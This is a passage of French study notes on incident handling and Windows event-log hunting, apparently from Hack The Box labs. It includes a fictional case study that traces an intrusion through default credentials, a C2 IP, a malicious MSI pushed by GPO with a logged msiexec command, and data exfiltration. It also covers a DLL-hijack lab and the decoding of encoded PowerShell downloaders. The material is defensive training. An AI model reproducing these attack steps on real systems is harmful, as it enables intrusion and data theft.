<p>Les incidents graves sont <strong>escaladés</strong> en priorité.</p>
<p><strong>Confidentialité</strong> :</p>
<ul>
<li>Les infos d’incident sont <strong>need-to-know</strong>.</li>
<li>L’attaquant peut être interne.</li>
<li>La com interne/externe doit être gérée par les bonnes personnes (legal, com…).</li>
</ul>
<h3>Boucle d’investigation (IOCs → nouveaux leads → collecte)</h3>
<p>Le processus d’enquête suit une boucle en 3 étapes :</p>
<ol>
<li><strong>Création &amp; usage d’IOCs</strong></li>
<li><strong>Découverte de nouveaux leads / systèmes compromis</strong></li>
<li><strong>Collecte &amp; analyse de données sur ces systèmes</strong></li>
</ol>
<h3>IOCs</h3>
<p>IOC = <strong>indicateur de compromission</strong>.
Exemples : IP, hash de fichier, nom de fichier, clé de registre…</p>
<p>On peut :</p>
<ul>
<li>les décrire dans des formats comme <strong>OpenIOC</strong>, <strong>YARA</strong>, <strong>STIX</strong> (JSON).</li>
<li>les utiliser pour <strong>scanner l’environnement</strong> à la recherche d’autres machines compromises.</li>
<li>dans TheHive, les ajouter via l’onglet <strong>Observables</strong>, avec un flag “Is IOC”.</li>
</ul>
<p>Attention :</p>
<ul>
<li>Certains IOCs sont <strong>trop génériques</strong> → beaucoup de faux positifs.</li>
<li>On doit <strong>prioriser</strong> sur les systèmes susceptibles de donner de nouvelles infos.</li>
</ul>
<h3>Collecte &amp; forensics</h3>
<p>Deux approches principales :</p>
<ul>
<li><strong>Live response</strong> (machine allumée) :
<ul>
<li>memory dump, process list, connexions réseau, fichiers récents, etc.</li>
</ul></li>
<li><strong>Analyse offline</strong> :
<ul>
<li>shutdown contrôlé (en évitant de flinguer des preuves critiques),</li>
<li>disque cloné, etc.</li>
</ul></li>
</ul>
<p>Points importants :</p>
<ul>
<li>Limiter les <strong>modifications</strong> sur le système.</li>
<li>Conserver une <strong>chain of custody</strong> propre (admissible en justice).</li>
<li>La <strong>memory forensics</strong> devient de plus en plus cruciale dans les attaques avancées.</li>
</ul>
<h3>Sécurité des outils d’investigation</h3>
<ul>
<li>Attention aux outils qui <strong>cachent les credentials</strong> sur la machine distante.
<ul>
<li>Ex : <code>PsExec</code> avec credentials explicites → creds mis en cache.</li>
<li>Utilisation avec contexte courant (logon type 3 / WinRM) → pas de cache.</li>
</ul></li>
</ul>
<h3>Rôle de l’IA dans la détection</h3>
<p>L’IA est utilisée pour :</p>
<ul>
<li><strong>Triage automatique</strong> des alertes,</li>
<li><strong>Corrélation</strong> et reconstruction de timeline,</li>
<li><strong>Playbooks automatiques</strong>, réponse semi-automatisée,</li>
<li><strong>Post-incident analysis</strong> &amp; amélioration continue.</li>
</ul>
<p>Ex : <strong>Elastic Security Attack Discovery</strong> :</p>
<ul>
<li>Agrège plusieurs alertes,</li>
<li>Construit un <strong>historique d’attaque</strong> (host, user, phases MITRE…),</li>
<li>Fournit une vue synthétique de l’incident.</li>
</ul>
<h2>Containment, Eradication &amp; Recovery</h2>
<p>Quand on a une bonne vision de :</p>
<ul>
<li><strong>ce qui s’est passé</strong>,</li>
<li><strong>l’ampleur de l’incident</strong>,</li>
<li><strong>les systèmes touchés</strong>,</li>
</ul>
<p>on passe à la phase <strong>Containment, Eradication &amp; Recovery</strong>.</p>
<h3>Containment</h3>
<p>Objectif : <strong>empêcher la propagation</strong> de l’attaque.</p>
<p>On distingue :</p>
<ul>
<li><strong>Short-term containment</strong> :
<ul>
<li>actions temporaires, peu intrusives :
<ul>
<li>isolation réseau (VLAN, câble débranché),</li>
<li>modification du DNS du C2 vers un sinkhole,</li>
</ul></li>
<li>permet de <strong>gagner du temps</strong> + faire des images forensic.</li>
</ul></li>
<li><strong>Long-term containment</strong> :
<ul>
<li>changements plus durables :
<ul>
<li>reset mots de passe,</li>
<li>règles firewall permanentes,</li>
<li>désactivation de services,</li>
<li>patchs, etc.</li>
</ul></li>
</ul></li>
</ul>
<p>Important :</p>
<ul>
<li>Les actions doivent être <strong>coordonnées</strong> et appliquées sur <strong>toute la surface</strong> en même temps.
Sinon, on alerte l’attaquant et il peut adapter ses TTP.</li>
</ul>
<h3>Eradication</h3>
<p>But : <strong>sortir complètement</strong> l’attaquant de l’environnement.</p>
<p>Exemples d’actions :</p>
<ul>
<li>Suppression des malwares &amp; backdoors.</li>
<li>Rebuild de certains systèmes, restauration depuis backup.</li>
<li>Application de patchs supplémentaires.</li>
<li>Renforcement de la config (hardening).</li>
</ul>
<h3>Recovery</h3>
<p>But : <strong>revenir à une exploitation normale</strong>.</p>
<ul>
<li>Les métiers vérifient que les systèmes restaurés fonctionnent.</li>
<li>On remet en prod progressivement.</li>
<li><strong>Surveillance renforcée</strong> des systèmes restaurés :
<ul>
<li>logons inhabituels,</li>
<li>processus suspects,</li>
<li>modifications registres typiques de persistance.</li>
</ul></li>
</ul>
<p>Si des <strong>IOCs réapparaissent pendant recovery</strong>, il faut :</p>
<blockquote>
<p>Repartir en phase Investigation, pas continuer naïvement la recovery.</p>
</blockquote>
<h2>Post-Incident Activity</h2>
<p>Dernière phase : <strong>capitaliser</strong> sur l’incident.</p>
<h3>Post-mortem &amp; lessons learned</h3>
<ul>
<li>Réunion avec tous les <strong>stakeholders</strong> (tech, management, legal, com, etc.).</li>
<li>Analyse :
<ul>
<li>Qu’est-ce qui s’est passé ? Quand ?</li>
<li>Comment l’équipe a réagi vs les <strong>playbooks</strong> ?</li>
<li>Les métiers ont-ils fourni l’info nécessaire ?</li>
<li>Quelles actions ont été faites (containment/eradication/recovery) ?</li>
<li>Quelles mesures préventives mettre en place ?</li>
</ul></li>
<li>On met à jour :
<ul>
<li><strong>politiques</strong>, <strong>playbooks</strong>, <strong>règles de détection</strong>, <strong>formation</strong>.</li>
</ul></li>
</ul>
<h3>Rapport d’incident</h3>
<p>Le rapport final documente :</p>
<ul>
<li>La chronologie,</li>
<li>L’impact business,</li>
<li>Les actions réalisées,</li>
<li>Les coûts,</li>
<li>Les recommandations.</li>
</ul>
<p>Il est utile pour :</p>
<ul>
<li>les incidents futurs,</li>
<li>la communication vers la direction,</li>
<li>les éventuelles actions légales.</li>
</ul>
<h2>Étude de cas : compromission Insight Nexus</h2>
<h3>Contexte de la cible</h3>
<ul>
<li><strong>Insight Nexus</strong> : société de <strong>market research / data analytics</strong>, clients Fortune 500.</li>
<li>Actifs importants :
<ul>
<li>Application ManageEngine ADManager Plus (exposée Internet).</li>
<li>Portail client PHP avec upload de fichiers (<code>portal.insightnexus.com</code>).</li>
<li>DC : <code>DC01.insight.local</code>.</li>
<li>File server : <code>FS01</code> (<code>\\\\fs01\\projects</code>).</li>
<li>DB server : <code>DB01</code>.</li>
<li>Workstations <code>DEV-001</code> à <code>DEV-120</code>, dont <code>DEV-021</code> exposé en RDP.</li>
</ul></li>
</ul>
<p>Sécurité :</p>
<ul>
<li>Firewall périmètre avec logs basiques (pas de TI).</li>
<li>IDS très bruyant (beaucoup de faux positifs).</li>
<li>Agents <strong>Wazuh</strong> sur une partie des machines.</li>
<li>SIEM central (Wazuh) + logs Windows, web, firewall.</li>
<li><strong>TheHive</strong> pour la gestion des cas, avec <strong>Cortex</strong> pour l’enrichissement.</li>
</ul>
<h3>Menaces : deux groupes distincts</h3>
<ol>
<li><strong>Crimson Fox</strong> (acteur principal)
<ul>
<li>Groupe avancé, probablement <strong>étatique</strong>, spécialisé dans :
<ul>
<li>vol de credentials,</li>
<li>persistance longue durée,</li>
<li>espionnage.</li>
</ul></li>
</ul></li>
<li><strong>Silent Jackal</strong> (acteur secondaire)
<ul>
<li>Groupe criminel opportuniste, bas niveau :
<ul>
<li>defacements,</li>
<li>intrusions “pour la signature”.</li>
</ul></li>
</ul></li>
</ol>
<p>Les deux opèrent <strong>en parallèle</strong> dans le même environnement, ce qui complexifie la réponse.</p>
<h3>Chaîne d’attaque Crimson Fox</h3>
<ol>
<li><strong>Accès initial via ManageEngine</strong>
<ul>
<li><code>manage.insightnexus.com</code> exposé avec <strong>credentials par défaut <code>admin/admin</code></strong>.</li>
<li>Les admins ont oublié de les changer après une mise à jour.</li>
<li>Pas de <strong>MFA</strong>, pas de WAF.</li>
<li>Logon réussi via console web.</li>
</ul></li>
<li><strong>Exploitation d’une RCE Java sur ManageEngine</strong>
<ul>
<li>Vuln Java RCE dans ADManager Plus.</li>
<li>L’attaquant exploite la vuln et ouvre un <strong>C2 HTTPS</strong> vers <code>103.112.60.117</code>.</li>
<li>Log Sysmon (Event ID 3) :
<ul>
<li><code>Image: C:\\ManageEngine\\jre\\bin\\java.exe</code></li>
<li><code>DestinationIp: 103.112.60.117</code></li>
<li><code>DestinationPort: 443</code></li>
</ul></li>
</ul></li>
<li><strong>Recon AD &amp; création d’un compte Domain Admin</strong>
<ul>
<li>Enumeration users/computers via ManageEngine.</li>
<li>Création d’un compte <strong>Domain Admin</strong> dédié à l’attaquant.</li>
</ul></li>
<li><strong>Découverte d’un poste RDP exposé : DEV-021</strong>
<ul>
<li><code>DEV-021</code> a un RDP ouvert vers Internet (usage dev distant).</li>
<li>RDP depuis <code>103.112.60.117</code> vers <code>DEV-021</code> avec le nouveau compte DA.</li>
<li>Event 4624 (logon type 10 – RDP) :
<ul>
<li><code>SourceNetworkAddress: 103.112.60.117</code></li>
<li><code>New Logon: insight\\svc_deployer</code></li>
</ul></li>
</ul></li>
<li><strong>Accès aux file shares &amp; exfiltration</strong>
<ul>
<li>Parcours des shares sur <code>FS01</code>, notamment <code>\\\\fs01\\projects</code>.</li>
<li>Logs 5140 “A network share object was accessed”.</li>
<li>Les données client sont compressées en <code>diagnostics_data.zip</code> et envoyées via HTTPS à un IP externe (dans les questions du module : <code>93.184.216.34</code>).</li>
</ul></li>
<li><strong>Déploiement de spyware via GPO / MSI</strong>
<ul>
<li>Depuis <code>DEV-021</code>, exécution de scripts PowerShell avec les creds Domain Admin.</li>
<li>Création d’un <strong>GPO</strong> qui pousse un MSI : <code>C:\\Windows\\Temp\\java-update.msi</code>.</li>
<li>Logs Sysmon :
<ul>
<li>Event 11 → création du fichier MSI.</li>
<li>Event 1 → <code>msiexec /i C:\\Windows\\Temp\\java-update.msi /quiet</code>.</li>
</ul></li>
<li>Le MSI installe un <strong>scheduled task</strong> de spyware, déployé sur toutes les machines du domaine via GPO.</li>
</ul></li>
</ol>
<p>Crimson Fox passe ensuite en <strong>mode low noise</strong> : beacons C2 périodiques, faible activité visible.</p>
<h3>Activité Silent Jackal</h3>
<p>En parallèle :</p>
<ul>
<li>Silent Jackal exploite une vuln <strong>upload de fichier</strong> sur le portail PHP.</li>
<li>Upload d’un fichier <strong><code>checkme.txt</code></strong> à la racine du web server, avec texte “SilentJackal was here”.</li>
<li>Il ne progresse pas plus loin, mais ce <strong>fichier marqueur</strong> provoque une alerte.</li>
</ul>
<p>Cette activité “bruyante” permet aux défenseurs de <strong>repérer l’incident</strong>, même si le groupe avancé (Crimson Fox) est beaucoup plus discret.</p>
<h3>Découverte &amp; corrélation</h3>
<ul>
<li>Un admin repère des <strong>connexions sortantes étranges</strong> depuis le serveur ManageEngine vers un IP d’Europe de l’Est.</li>
<li>Il contacte le <strong>SOC</strong>.</li>
<li>Un analyste SOC voit l’alerte concernant <code>checkme.txt</code> et commence à creuser.</li>
<li>Problème : beaucoup d’alertes de création de fichier → <strong>alert fatigue</strong>, l’alerte n’avait pas été escaladée.</li>
</ul>
<p>En corrélant les logs, l’analyste identifie :</p>
<ul>
<li>Logins ManageEngine suspects depuis IP étrangères.</li>
<li>Process <code>msiexec</code> exécutant un MSI sur plusieurs hosts.</li>
<li>Logs d’énumération LDAP &amp; création de GPO.</li>
<li>Access logs sur le file server (compression &amp; exfil).</li>
<li>Connexions HTTPS vers l’IP C2.</li>
</ul>
<h3>Réponse : TheHive &amp; actions IR</h3>
<ol>
<li><strong>Création de cas dans TheHive</strong>
<ul>
<li>Case : <strong>“Insight Nexus — ManageEngine Compromise”</strong>.</li>
<li>Liens vers les alertes associées :
<ul>
<li>logins admin ManageEngine,</li>
<li>msiexec / MSI,</li>
<li>reconnaissance LDAP,</li>
<li>upload vers IP externe,</li>
<li>événement <code>checkme.txt</code>.</li>
</ul></li>
<li>Attribution des rôles :
<ul>
<li>Triage Analyst,</li>
<li>Forensics Lead,</li>
<li>Containment Lead,</li>
<li>Communications Lead.</li>
</ul></li>
<li>Priorité : <strong>Critical</strong> (exfil confirmée).</li>
</ul></li>
<li><strong>Containment – réseau</strong>
<ul>
<li>Blocage des flux vers <code>103.112.60.117</code> sur :
<ul>
<li>firewall périmètre,</li>
<li>firewalls Hôte.</li>
</ul></li>
<li>Règles d’egress temporaires plus strictes.</li>
<li>Ajout d’une signature IDS sur cet IP.</li>
</ul></li>
<li><strong>Containment – comptes</strong>
<ul>
<li>Désactivation du compte admin ManageEngine.</li>
<li>Rotation de tous les comptes privilégiés exposés dans les logs (service, deployer, etc.).</li>
<li>Restriction de l’accès à la console ManageEngine à des IP internes seulement.</li>
<li>Forcer les reset de mot de passe + invalider les sessions actives.</li>
</ul></li>
<li><strong>Isolation hosts</strong>
<ul>
<li>Isolement réseau de :
<ul>
<li><code>manage.insightnexus.com</code>,</li>
<li><code>DEV-021</code>,</li>
<li>machines avec <code>java-update.msi</code> présent / exécuté.</li>
</ul></li>
<li>Désactivation temporaire de certaines <strong>scheduled tasks</strong> et GPO.</li>
</ul></li>
<li><strong>Collecte forensic</strong>
<ul>
<li>Sur les machines isolées :
<ul>
<li>mémoire, process, registres, disques.</li>
</ul></li>
<li>Export des logs :
<ul>
<li>ManageEngine audit,</li>
<li>web access,</li>
<li>Wazuh / SIEM.</li>
</ul></li>
<li>Sauvegarde des fichiers :
<ul>
<li><code>java-update.msi</code>,</li>
<li><code>diagnostics_data.zip</code>,</li>
<li>éventuels web shells.</li>
</ul></li>
</ul></li>
</ol>
<h3>Mapping MITRE ATT&amp;CK</h3>
<p>Quelques mappings utilisés :</p>
<ul>
<li><strong>Reconnaissance</strong> :
<ul>
<li><code>T1595 – Active Scanning</code></li>
</ul></li>
<li><strong>Initial Access</strong> :
<ul>
<li><code>T1078.004 – Valid Accounts (Default Accounts)</code> pour <code>admin/admin</code>.</li>
<li><code>T1190 – Exploit Public-Facing Application</code> pour le portail PHP / vuln ManageEngine.</li>
</ul></li>
<li><strong>Execution / Persistence</strong> :
<ul>
<li><code>T1059</code> – Command &amp; Scripting Interpreter (PowerShell).</li>
<li><code>T1547</code> / <code>T1543</code> – Persist via services, scheduled tasks, GPO.</li>
</ul></li>
<li><strong>Credential Access</strong> :
<ul>
<li><code>T1003.001 – LSASS Memory</code> (Mimikatz, VaultCli.dll).</li>
</ul></li>
<li><strong>Lateral Movement</strong> :
<ul>
<li><code>T1021.001 – Remote Desktop Protocol</code>.</li>
</ul></li>
<li><strong>C2</strong> :
<ul>
<li><code>T1071.001 – Web Protocols</code> (C2 HTTPS vers 103.112.60.117).</li>
</ul></li>
<li><strong>Exfiltration</strong> :
<ul>
<li><code>T1560</code> – Archive data (<code>diagnostics_data.zip</code>).</li>
<li><code>T1041</code> – Exfiltration over C2 channel.</li>
</ul></li>
</ul>
<h3>Leçons apprises</h3>
<ul>
<li>Les <strong>credentials par défaut sur des applications exposées</strong> sont toujours mortels.</li>
<li>Plusieurs <strong>acteurs</strong> peuvent être présents simultanément (un “bruyant”, un “furtif”).</li>
<li>L’absence de <strong>corrélation cross-outils</strong> retarde la détection et donne plus de temps à l’attaquant.</li>
<li>Supprimer un <strong>fichier indicateur</strong> (ex : <code>checkme.txt</code>) ne supprime pas la <strong>cause racine</strong>.</li>
<li><p>La <strong>post-compromission</strong> doit systématiquement inclure :</p>
<ul>
<li>rechercher la persistance,</li>
<li>vérifier les comptes &amp; GPO,</li>
<li>analyser les logs d’exfil.</li>
</ul>
<h2>Partie pratique : TheHive &amp; Wazuh</h2>
<p>La partie labs demande d’utiliser <strong>TheHive</strong> et des <strong>logs Wazuh</strong> pour compléter des questions.</p>
<h3>TheHive – Mimikatz &amp; alerts</h3>
<p>Exemples de tâches :</p>
<ul>
<li>Se connecter à TheHive avec :</li>
<li>Ouvrir l’alerte <strong>“[InsightNexus] Hacker tool Mimikatz was detected”</strong>.</li>
<li>Lier l’alerte à un cas.</li>
<li>Lire les détails :
<ul>
<li>machine touchée,</li>
<li>heure,</li>
<li>utilisateur qui a lancé Mimikatz (<code>domain\\user</code> dans les questions).</li>
</ul></li>
<li>Mapper l’activité à <strong>MITRE</strong> (Credential Dumping <code>T1003.001</code>).</li>
</ul>
<h3>Wazuh logs – Credential dumping, persistance, exfil</h3>
<p>En téléchargeant <strong><code>wazuh_export.zip</code></strong>, on retrouve :</p>
<ul>
<li>Un événement <strong>4688</strong> montrant une exécution d’outil de credential dumping dont le parent process est :
<ul>
<li><code>C:\\Program Files\\Mozilla Firefox\\firefox.exe</code>
→ typique d’un exécutable téléchargé depuis le navigateur.</li>
</ul></li>
<li>Une persistance sur <code>DB01</code> :
<ul>
<li><code>imagePath = C:\\Windows\\PSEXESVC.exe</code>
→ service PsExec utilisé comme mécanisme de persistance / remote execution.</li>
</ul></li>
<li>Activité d’exfiltration :
<ul>
<li>upload de <code>diagnostics_data.zip</code> vers <strong><code>93.184.216.34</code></strong>.</li>
</ul></li>
<li>Accès au share <code>\\\\fs01\\projects</code> par l’utilisateur <strong><code>svc_admin</code></strong>.</li>
</ul>
<p>On doit :</p>
<ul>
<li>Identifier ces événements,</li>
<li>les relier au <strong>scénario Crimson Fox</strong>,</li>
<li>les utiliser comme <strong>IOCs</strong> pour rechercher d’autres machines touchées.</li>
</ul>
<h3>Logs-wazuh.zip &amp; PowerShell malveillant</h3>
<p>Dans <strong><code>logs-wazuh.zip</code></strong> :</p>
<ul>
<li>On repère un <strong>script PowerShell suspect</strong>, souvent encodé en Base64 (<code>EncodedCommand</code>).</li>
<li>Méthode typique :
<ol>
<li>Repérer la commande dans les logs (Event ID 4104 ou 4688).</li>
<li>Décoder la chaîne Base64 (PowerShell <code>FromBase64String</code>/<code>UTF8</code> ou outil externe).</li>
<li>Lire la commande en clair :
<ul>
<li>téléchargement de payload depuis un <strong>IP externe</strong> (C2),</li>
<li>éventuellement dépôt de fichier, exécution, etc.</li>
</ul></li>
<li>En extraire :
<ul>
<li>l’<strong>IP</strong> du C2 (réponse demandée dans le module),</li>
<li>le <strong>user</strong> qui a exécuté la commande (<code>domain\\user</code>).</li>
</ul></li>
</ol></li>
</ul>
<p>Ce type d’activité mappe typiquement à :</p>
<ul>
<li><code>T1105 – Ingress Tool Transfer</code> (téléchargement de fichier depuis C2),</li>
<li><code>T1059 – Command &amp; Scripting Interpreter (PowerShell)</code>.</li>
</ul>
<h3>Enrichissement VirusTotal</h3>
<p>Le module demande aussi :</p>
<ul>
<li>D’ouvrir l’alerte <strong>“[InsightNexus] Admin Login via ManageEngine Web Console”</strong>.</li>
<li>De récupérer un IP externe (commençant par <code>203...</code>), puis :
<ul>
<li>chercher cet IP sur <strong>VirusTotal</strong>,</li>
<li>regarder les fichiers associés, notamment un fichier qui commence par “Mango…”,</li>
<li>ajouter les infos dans les <strong>notes</strong> de l’alerte.</li>
</ul></li>
<li>De faire pareil pour un IP commençant par <code>198...</code> et noter la <strong>ville</strong> dans le WHOIS.</li>
</ul>
<p>L’idée n’est pas juste de “donner une réponse”, mais de montrer :</p>
<ul>
<li>comment <strong>enrichir</strong> un IOC via une plateforme CTI,</li>
<li>comment <strong>documenter</strong> ces infos dans TheHive.</li>
</ul>
<h2>Ce que j’ai appris (et que je peux réutiliser)</h2>
<h3>Concepts &amp; frameworks</h3>
<ul>
<li>Différence claire entre <strong>event</strong> et <strong>incident</strong>.</li>
<li>Rôle de l’<strong>Incident Manager</strong> et importance de la <strong>priorisation</strong>.</li>
<li>Utilisation combinée :
<ul>
<li><strong>Cyber Kill Chain</strong> pour visualiser la progression de l’attaquant,</li>
<li><strong>MITRE ATT&amp;CK</strong> pour décrire finement les TTP,</li>
<li><strong>Pyramid of Pain</strong> pour privilégier les <strong>détections comportementales</strong> plutôt que les simples IOCs.</li>
</ul></li>
</ul>
<h3>Processus d’Incident Handling</h3>
<ul>
<li>Les 4 phases NIST :
<ol>
<li><strong>Preparation</strong></li>
<li><strong>Detection &amp; Analysis</strong></li>
<li><strong>Containment, Eradication &amp; Recovery</strong></li>
<li><strong>Post-Incident Activity</strong></li>
</ol></li>
<li>Importance de :
<ul>
<li>ne pas <strong>sauter des étapes</strong>,</li>
<li>garder une <strong>timeline</strong> à jour,</li>
<li>documenter toutes les actions,</li>
<li>revenir à <strong>Investigation</strong> si des IOCs réapparaissent.</li>
</ul></li>
</ul>
<h3>Défense &amp; prévention</h3>
<ul>
<li>Les vrais <strong>quick wins</strong> :
<ul>
<li>supprimer les <strong>default / weak creds</strong>,</li>
<li><strong>MFA</strong> sur tous les accès admin,</li>
<li>segmentation réseau, 802.1X, Conditional Access,</li>
<li>baselines AD / endpoints,</li>
<li>DMARC pour réduire le phishing,</li>
<li>user awareness &amp; purple teaming.</li>
</ul></li>
</ul>
<h3>Pratique outils</h3>
<ul>
<li>Utilisation de <strong>TheHive</strong> pour :
<ul>
<li>grouper des alertes en <strong>cas</strong>,</li>
<li>enrichir les alertes (notes, observables, MITRE IDs),</li>
<li>suivre l’avancement de l’enquête.</li>
</ul></li>
<li>Lecture de logs <strong>Wazuh / Windows / Sysmon</strong> pour :
<ul>
<li>détecter le <strong>credential dumping</strong>,</li>
<li>repérer des <strong>persistances services</strong> (<code>PSEXESVC.exe</code>),</li>
<li>reconnaître les patterns de <strong>RDP public</strong> (Event 4624 type 10, IP externe),</li>
<li>identifier les <strong>flux d’exfiltration</strong>.</li>
</ul></li>
<li>Méthodo pour <strong>décoder un PowerShell obfusqué</strong> et en sortir les <strong>IOCs</strong>.</li>
</ul></li>
</ul>
</div></details><details><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Windows Event Logs &amp; Finding Evil</strong></summary><div class="indented"><p><figure class="image"><a href="../static/image/cjca/image42.png"><img alt="" src="../static/image/cjca/image42.png"/></a></figure></p>
<h2>Contexte &amp; objectifs</h2>
<p>Ce mini-module Hack The Box montre comment exploiter les journaux Windows pour <strong>détecter, comprendre et chasser des activités malveillantes</strong> sur un poste Windows :</p>
<ul>
<li>Journaux classiques Windows (Application / System / Security / …)</li>
<li>Sysmon et ses évènements riches (création de process, connexions réseau, chargement de DLL, accès à des process sensibles, …)</li>
<li><strong>ETW (Event Tracing for Windows)</strong> comme source de télémétrie avancée</li>
<li><strong>Get-WinEvent</strong> pour analyser des tonnes de logs (fichiers .evtx, Sysmon, ETW) en PowerShell</li>
</ul>
<p>Le module alterne théorie, détection d’attaques (DLL hijack, injection .NET/PowerShell, credential dumping) et exercices pratiques sur une VM Windows.</p>
<h2>Windows Event Logs : bases &amp; anatomie</h2>
<h3>Types de journaux</h3>
<p>Windows enregistre énormément d’infos dans différents logs :</p>
<ul>
<li><strong>Application</strong> : erreurs et infos des programmes</li>
<li><strong>System</strong> : évènements du système / pilotes / services</li>
<li><strong>Security</strong> : authentification, accès à des ressources, audit</li>
<li><strong>Setup</strong> : installation / configuration</li>
<li><strong>Forwarded Events</strong> : logs centralisés provenant d’autres machines</li>
</ul>
<p>Ces logs sont consultables :</p>
<ul>
<li>avec <strong>Event Viewer (eventvwr.msc)</strong></li>
<li>ou via des APIs / cmdlets (Windows Event Log API, Get-WinEvent, etc.)</li>
</ul>
<p>On peut aussi ouvrir des <strong>.evtx sauvegardés</strong> (“Saved Logs”).</p>
<h3>Anatomie d’un évènement</h3>
<p>Chaque entrée dans un journal est un <strong>Event</strong> avec notamment :</p>
<ul>
<li><strong>Log Name</strong> : Application, System, Security, …</li>
<li><strong>Source</strong> : composant qui a généré l’évènement</li>
<li><strong>Event ID</strong> : identifiant unique du type d’évènement</li>
<li><strong>Task Category</strong> : sous-catégorie / contexte</li>
<li><strong>Level</strong> : Information, Warning, Error, Critical, Verbose</li>
<li><strong>Keywords</strong> : flags (ex. Audit Success / Audit Failure en Security)</li>
<li><strong>User</strong> : compte utilisateur responsable</li>
<li><strong>OpCode</strong> : type d’opération (start, stop, etc.)</li>
<li><strong>Logged</strong> : date / heure</li>
<li><strong>Computer</strong> : nom de la machine</li>
<li><strong>XML</strong> : version complète en XML avec toutes les données</li>
</ul>
<p>Ce format XML est crucial pour :</p>
<ul>
<li>faire des <strong>filtres avancés</strong> dans l’Event Viewer (XML Query)</li>
<li>et pour automatiser avec PowerShell (ToXml(), parsing, etc.)</li>
</ul>
<h3>Exemple clé : Event ID 4624 – Successful Logon</h3>
<p>L’event <strong>4624</strong> dans le journal <em>Security</em> correspond à un <strong>logon réussi</strong> :</p>
<ul>
<li>contient notamment <strong>Logon ID</strong> (identifiant de session)</li>
<li><strong>Logon Type</strong> (interactif, service, RDP, batch, etc.)</li>
</ul>
<p>On peut :</p>
<ul>
<li>utiliser le <strong>Logon ID</strong> pour <strong>corréler</strong> plusieurs évènements (logon, privilèges élevés, actions sur fichiers, etc.)</li>
<li>surveiller les <strong>types de logon</strong> anormaux (par ex. service / batch pour un compte utilisateur classique)</li>
</ul>
<p>Autre évènement important associé : <strong>4672 – Special privileges assigned to new logon</strong>, qui indique un logon avec des privilèges élevés (SeDebugPrivilege, etc.).</p>
<h3>SACL &amp; Event ID 4907 – Audit policy change</h3>
<p>L’Event <strong>4907</strong> signale un changement de <strong>SACL</strong> (System Access Control List) sur un objet (fichier, clé de registre…).</p>
<p>Une SACL sert à définir <strong>quelles actions seront journalisées</strong> (succès, échec).</p>
<p>Dans cet event, on trouve :</p>
<ul>
<li>l’objet ciblé (ObjectName)</li>
<li>le process responsable (<strong>ProcessName</strong>, ex. <em>SetupHost.exe</em>)</li>
<li>et les descripteurs de sécurité avant/après (OldSd / NewSd)</li>
</ul>
<p>C’est typiquement le genre d’évènement à corréler avec un logon (4624) pour comprendre <strong>qui</strong> a modifié <strong>quoi</strong>.</p>
<h3>IDs utiles à surveiller</h3>
<p>Quelques IDs particulièrement intéressants :</p>
<p><strong>System</strong></p>
<ul>
<li>1074 : arrêt/redémarrage du système (qui / pourquoi)</li>
<li>6005 / 6006 : démarrage / arrêt du service de log (boot/shutdown)</li>
<li>6013 : uptime (peut révéler des redémarrages suspects)</li>
<li>7040 : changement de type de démarrage d’un service</li>
</ul>
<p><strong>Security</strong></p>
<ul>
<li>1102 : audit log effacé (tentative de couvrir ses traces)</li>
<li>1116 / 1118 / 1119 / 1120 : détection/remédiation AV Defender</li>
<li>4624 : logon réussi</li>
<li>4625 : logon échoué (brute-force, essais suspects)</li>
<li>4648 : logon avec credentials explicites (lateral movement)</li>
<li>4656 : handle sur un objet (accès à un fichier/clé/process sensible)</li>
<li>4672 : logon avec privilèges spéciaux</li>
<li>4698 / 4700-4702 : création / modification / activation de tâches planifiées (persistence)</li>
<li>4719 : changement de la politique d’audit</li>
<li>4738 : compte utilisateur modifié</li>
<li>4771 / 4776 : échecs Kerberos / validation de credentials</li>
<li>5001 : changement de config de la protection temps réel AV</li>
<li>5140 / 5142 / 5145 : accès / création / vérification d’un partage réseau</li>
<li>5157 : connexion bloquée par le Windows Filtering Platform</li>
<li>7045 : service installé (souvent utilisé par des malwares)</li>
</ul>
<p>🔑 <strong>Idée clé</strong> : savoir <strong>ce qui est “normal”</strong> dans ton environnement, et alerter sur les anomalies (heures inhabituelles, nouveaux services, tâches planifiées suspectes, logons admin non prévus…).</p>
<h2>Sysmon &amp; Event Logs : trouver l’evil</h2>
<h3>Rappel Sysmon</h3>
<p><strong>Sysmon (System Monitor)</strong> :</p>
<ul>
<li>service + driver Windows</li>
<li>logue dans <strong>Microsoft-Windows-Sysmon/Operational</strong></li>
<li>fournit des évènements bien plus détaillés que les journaux classiques :
<ul>
<li><strong>ID 1</strong> : Process Create</li>
<li><strong>ID 3</strong> : Network Connection</li>
<li><strong>ID 7</strong> : Image Loaded (chargement de DLL)</li>
<li><strong>ID 10</strong> : ProcessAccess (accès à un autre process, ex. LSASS)</li>
<li>etc.</li>
</ul></li>
</ul>
<p>Le comportement de Sysmon est totalement piloté par un <strong>fichier de configuration XML</strong>.</p>
<p>Le module utilise la config de <strong>SwiftOnSecurity</strong> (GitHub), qui est une base très complète.</p>
<h3>Détection 1 : DLL hijacking (calc.exe / WININET.dll)</h3>
<p>But : détecter un <strong>DLL hijack</strong>, ici sur <strong>calc.exe</strong> avec une DLL Windows légitime copiée et remplacée.</p>
<ol>
<li>Config Sysmon :
<ul>
<li>règle <strong>ImageLoad</strong> passée en mode <code>exclude</code> sans règles → <strong>tout est logué</strong> (aucune exclusion).</li>
</ul></li>
<li>On place un <code>calc.exe</code> et une fausse <strong>WININET.dll</strong> (hijacked) dans un répertoire <strong>écrivable</strong> (ex. Desktop).</li>
<li>On lance <code>calc.exe</code> : au lieu de la calculatrice, c’est la DLL malveillante qui affiche un message.</li>
</ol>
<p>Dans les logs Sysmon (Event ID 7) on observe :</p>
<ul>
<li><strong>Image</strong> : <code>calc.exe</code> lancé depuis un dossier utilisateur (pas System32)</li>
<li><strong>ImageLoaded</strong> : <code>WININET.dll</code> chargée depuis ce même dossier</li>
<li><code>Signed: false</code> alors que la vraie DLL système est signée Microsoft</li>
</ul>
<p><strong>IOCs principaux :</strong></p>
<ol>
<li><strong>calc.exe</strong> en dehors de <code>C:\Windows\System32</code> / <code>SysWOW64</code></li>
<li><code>WININET.dll</code> chargée en dehors de <code>System32</code> par calc.exe</li>
<li>DLL non signée alors que normalement <strong>signée Microsoft</strong></li>
</ol>
<h3>Détection 2 : Unmanaged PowerShell / C# injection</h3>
<p>Idée : certains outils injectent un <strong>runtime .NET</strong> (clr.dll, clrjit.dll) dans des process qui ne sont pas censés exécuter du .NET.</p>
<p>Outils :</p>
<ul>
<li><strong>Process Hacker</strong> pour voir :
<ul>
